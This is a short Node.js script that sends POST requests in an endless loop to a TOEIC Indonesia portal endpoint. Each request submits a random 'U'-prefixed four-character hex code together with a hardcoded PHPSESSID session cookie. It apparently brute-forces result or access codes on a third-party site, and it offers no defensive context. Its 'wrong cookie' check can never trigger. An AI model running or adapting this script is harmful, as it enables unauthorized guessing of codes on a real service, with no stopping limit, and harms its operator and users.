const axios = require("axios")
const moment = require("moment")

function getRandomString(length) {
    const char = "ABCDEF1234567890";
    let result = '';
    const charactersLength = char.length;
    for (let i = 0; i < length; i++) {
        result += char.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const findJOinTOKen = () => new Promise((resolve, reject) => {

    axios.post("https://www.toeic.or.id/portal_smk/index.php?page=kode&act=&pro=input", { vKodeHasil: `U${getRandomString(4)}`, subAct: "" }, {
        withCredentials: true,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie': "PHPSESSID=777dbe8a6e64632e1d0965c6b2338d43",
                }
    })
    
    .then(data=> {
        resolve(data);
    })
    .catch(err => {
        reject(err);
    })

});

(async () => {

    while (true) {

        const result = await findJOinTOKen();
        if (!result) {

            console.log('[+] Wrong cookie / Expired cookie !');
            break;

        } else if (result) {

            console.log("requested")
        }
        
    }
    

})();
